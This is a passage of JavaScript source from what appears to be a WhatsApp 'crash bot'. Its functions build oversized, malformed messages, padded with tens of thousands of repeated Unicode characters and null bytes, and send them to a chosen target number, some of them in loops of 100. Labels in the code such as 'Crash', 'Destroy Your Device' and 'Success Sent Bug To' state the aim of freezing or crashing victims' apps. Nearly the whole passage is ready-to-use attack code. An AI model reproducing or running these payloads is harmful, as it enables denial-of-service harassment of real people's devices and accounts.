yraa1Imp9Lff9hPI16bezVPEqZxnIEfImjZGBXOGlyjLcc5hfoYlV55VuiIRhjL9NZSAzfMAZoaz8iaOldxYxtNuLEGLWK71Ypu56jaNNVW9inDCMpXIIjvZbSq9hZ46jdaMiX6et6rGHYlCipSW6Mtt2gevGYADv7z3KaOaxvI3f1NaiLa4ToSl2LInxmWF12YGBnkwX5QoDkZ5MsqFw2pzxyYaG4JHA+wnB3MTj/DC7KqZYg/BlrlicmWXb7FcLtxH1JucEkLxFbOdvZlbmioYHfcC3FNp/k9CXIdNy3R6lmpRkAI5meYNpQg9zM0GN5yY1le0BTnJxxNVp9SiixLCyiXe91D2Gdn8f/8QAHxEBAQACAgEFAAAAAAAAAAAAAQACERIxAyEiMkFh/9oACAECAQE/ADuXiQ7Bk1jH1eXAcFsOKX5b9Gfim4ONtse5fcYhCvU3/8QAHBEBAAICAwEAAAAAAAAAAAAAAQACESEDEjFB/9oACAEDAQE/AK8dzF8E70uK7h1rZx5KpbkBNSuqv0dQsmh1FseM+dvoxruvGOncrx4sFtE6V65+Q4Bv7rLOapWgh5LXWrKUpXqtxH0lL1Va59wZn//Z",
                    contextInfo: {
                       mentionedJid: mentionedJid,
                       isSampled: true,
                       participant: target,
                       remoteJid: "status@broadcast",
                       forwardingScore: 9999,
                       isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    let delayInteractive = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "🐉CRASH❄️".repeat(800),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    const msg = await generateWAMessageFromContent(target, PImageUndefined, {});
    
      await minato.relayMessage(target, {
        groupStatusMessageV2: {
          message: delayInteractive.message
        }
      }, { 
          messageId: delayInteractive.key.id 
      });

    await minato.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (crt) {
     console.error("EROR NJIR:", crt);
  }
}

async function JtwFreze(minato, target) {
try {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
  }, {
    upload: minato.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [jid],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "Hii I'm Minato",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...videoPayload,
          hasMediaAttachment: true
        },
        body: { text: "Minato" },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: {"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}
            },
            {
              name: "address_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(10000),
                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: target })
    await minato.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
} catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent Bug To ${target}`))
}

async function invsNewIos(target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await minato.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function iOSInvisble(target) {
  await minato.relayMessage("status@broadcast", {
    extendedTextMessage: {
      text: `You are ready?\n${"𑇂𑆵𑆴𑆿".repeat(50000)}`, 
      matchedText: "Destroy Your Device",
      description: "𑇂𑆵𑆴𑆿".repeat(9000),
      title: "𑇂𑆵𑆴𑆿".repeat(9000),
      textArgb: Math.random() * 2000,
      backgroundArgb: Math.random() * 2000,
      font: "SYSTEM", 
      inviteLinkGroupType: "DEFAULT", 
      jpegThumbnail: null, 
      contextInfo: {
        statusSourceType: "TEXT", 
        statusAttributionType: "RESHARED_FROM_MENTION", 
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: `You are ready?\n${"𑇂𑆵𑆴𑆿".repeat(50000)}`, 
              songId: "1137812656623908",
              title: "𑇂𑆵𑆴𑆿".repeat(9000),
              author: "𑇂𑆵𑆴𑆿".repeat(9000),
              artistAttribution: "𑇂𑆵𑆴𑆿".repeat(9000),
              isExplicit: true
            }
          }
        ]
      }
    }
  }, {
    statusJidList: [target]
  });
}

async function nixelCrashUiMessage(target) {
  await minato.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text:
                "👁‍🗨⃟꙰。⃝𝐍𝐢𝐱𝐞́𝐥𝐳 𝐍𝐞́𝐯𝐞𝐫𝐝𝐢́𝐞.ꪸ⃟‼️" +
                "ꦾ".repeat(20000) +
                "ꦽ".repeat(20000)
            },
            footer: {
              text: "👁‍🗨⃟꙰。⃝𝐍𝐢𝐱𝐞́𝐥𝐳 𝐍𝐞́𝐯𝐞𝐫𝐝𝐢́𝐞.ꪸ⃟‼️" +
                "ꦾ".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "👁‍🗨⃟꙰。⃝𝐍𝐢𝐱𝐞́𝐥𝐳 𝐍𝐞́𝐯𝐞𝐫𝐝𝐢́𝐞.ꪸ⃟‼️" + "ꦽ".repeat(30000),
                    url: "https://t.me/nixelxyz"
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "👁‍🗨⃟꙰。⃝𝐍𝐢𝐱𝐞́𝐥𝐳 𝐍𝐞́𝐯𝐞𝐫𝐝𝐢́𝐞.ꪸ⃟‼️" + "ꦽ".repeat(30000),
                    id: ".id1"
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "👁‍🗨⃟꙰。⃝𝐍𝐢𝐱𝐞́𝐥𝐳 𝐍𝐞́𝐯𝐞𝐫𝐝𝐢́𝐞.ꪸ⃟‼️" + "ꦽ".repeat(30000),
                    id: ".id2"
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "👁‍🗨⃟꙰。⃝𝐍𝐢𝐱𝐞́𝐥𝐳 𝐍𝐞́𝐯𝐞𝐫𝐝𝐢́𝐞.ꪸ⃟‼️" + "ꦽ".repeat(30000),
                    id: ".id3"
                  })
                }
              ]
            }
          }
        }
      }
    },
    { messageId: generateWAMessageID() }
  );
}

async function StuckUi(minato, target, ptcpt = true) {
  let msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            expiration: 1,
            ephemeralSettingTimestamp: 1,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            },
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: true
            }
          },
          body: {
            text: " </> </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅 " + "ꦾ".repeat(50000)
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(20000),
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" }
            ]
          }
        }
      }
    }
  };

  let msg2 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            locationMessage: {
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABQEDBAIGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzk9SclkpPXF+5iiyM2sklt0VsUww2IzVexT7ebhvSik1Cm1Q0G7HLrxdFdlQuxdrSswHScPkF2L6S5Cyj0uLSvEKrZkOTorkAnQB6pYAk4AgA/8QAJRAAAgICAgICAQUAAAAAAAAAAQIAAwQREiEQMQUTFCAiMlJx/9oACAEBAAE/AJqcZ3EcejHRdcoTBD41AJxgWEbXUZdHqDUPhKS46ENbIex4pwb7ByCyypqyVYaM46acDCpEC7mMCQVE466ddyrC3YP6ytQiAAT5KlmsUqs/DIBLGPRpSRHXYinqYj8WMRlaVqEUdQeo4B9y019ncu4rUW37nUVyJgIb7fRAiJRT/HtpU2/fh9aOzqXWYwJBtmfYnFVRtiLYy+MLJUp9ajUDHcwbftyLSD0PGQdKZ8giaVx0TCfNVprIIlucXTSjU+FfQeFplHoiZT83/wA/VRfZSf2mU5aGlSXmZkr3poTD4//EABwRAAICAgMAAAAAAAAAAAAAAAEQABAgIQISQf/aAAgBAgEBPwBDYfhXEzUIlisOzOJf/8QAGREAAgMBAAAAAAAAAAAAAAAAAREAECAw/9oACAEDAQE/ANkU4sLn/9k=",
              degreesLatitude: 0,
              degreesLongitude: 0
            }
          },
          body: {
            text: "\u0000".repeat(10000)
          },
          footer: {
            text: " { Tra4sh - Cursed } "
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(8888),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"\0${"\u0018".repeat(1000)}","sections":[{"title":"Zunn","rows":[]}]}`
              },
              {
                name: "form_message",
                buttonParamsJson: "\u0000".repeat(299999)
              }
            ]
          }
        }
      }
    }
  };

  let img = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
    fileLength: "62265",
    height: 1080,
    width: 1080,
    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFEyMiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };

  for (let i = 0; i < 5; i++) {
    let carouselMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: img,
              title: "\u2060".repeat(3000) + "amposs \n" + i
            },
            body: { text: "ꦾ".repeat(9999) },
            footer: { text: "" + i },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000)
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                },
                {
                  name: "payment_info",
                  buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
                },
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`
                },
                {
                  name: "payment_method",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                }
              ]
            }
          }
        }
      }
    };

    await minato.relayMessage(target, carouselMsg, {
      messageId: null,
      participant: { jid: target }
    });
  }

  await minato.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });

  await minato.relayMessage(target, msg2, {
    messageId: null,
    participant: { jid: target }
  });
}

async function UiForceVico(target) {
 await minato.relayMessage(target, {
  contactMessage: {
    displayName: `vico - Corporation${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}`,
    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:7eppeli - Corporation${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}\nTEL;type=Ponsel;waid=15517868400:15517868400\nX-WA-BIZ-DESCRIPTION:${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}\nX-WA-BIZ-NAME:7eppeli - Corporation\nEND:VCARD`, 
    jpegThumbnail: ZeppImg, 
    contextInfo: {
      externalAdReply: {
        body: "vicofunct", 
        title: "P3d0 - Ex3cutor" + "ꦽ".repeat(2500) + "ោ៝".repeat(2500), 
        thumbnail: ZeppImg, 
        renderLargerThumbnail: false, 
        showAdAttribution: true, 
        automatedGreetingMessageShown: true, 
        greetigMessageBody: "P3d0 - Ex3cutor", 
        sourceUrl: "https://t.me/vicofunct", 
        thumbnailUrl: "https://t.me/vicofunct", 
        mediaType: 1,
        adContextPreviewDismissed: true
      }, 
      isForwarded: true, 
      forwardingScore: 999,
      businessMessageForwardInfo: {
        businessOwnerJid: "15517868400@s.whatsapp.net"
      }, 
      participant: "15517868400@s.whatsapp.net", 
      remoteJid: "status@broadcast", 
      quotedMessage: {
        interactiveMessage: {
          header: {
            title: "❗⏤‌‌‌‌□☆vico⃤◇□❗" +  "ꦽ".repeat(2500) + "ោ៝".repeat(2500), 
            hasMediaAttachment: true, 
            jpegThumbnail: ZeppImg
          }, 
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(9000), 
            buttons: [
              {
                name: "review_and_pay", 
                buttonParamsJson: "{\"reference_id\":\"7eppeli.pedofile\",\"order\":{\"status\":\"payment_requested\",\"order_type\":\"ORDER\"},\"share_payment_status\":true}"
              }
            ]
          }
        }
      }
    }
  }
}, { participant: { jid:target }})

  switch (cmd) {

    // ═══════════════════════════════════
    //   MENU COMMAND
    // ══════════════════════════════════

    case 'menu': {
  await reaction('⏳');
  await reaction('⌛');
  await reaction('✅');
  let Menu = `
━━━━━━━━━━━━━━━━━━━━
    ʙᴏᴛ ɪɴғᴏ
━━━━━━━━━━━━━━━━━━━━
𐓷  _ᴄʀᴇᴀᴛᴏʀ: </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅_
𐓷  _ʙᴏᴛ ɴᴀᴍᴇ: 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻_
𐓷  _ᴠᴇʀ𝚜ɪᴏɴ: v5.0.0_
𐓷  _𝚜ᴛᴀᴛᴜᴛ:  ᴀᴄᴛɪғ_
𐓷  _ʀᴜɴᴛɪᴍᴇ: ${runtime(process.uptime())}_
𐓷  _ᴘʀᴇғɪ𝚡ᴇ: мᴜʟᴛɪ ᴘʀᴇғɪx_

━━━━━━━━━━━━━━━━━━━━
    𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

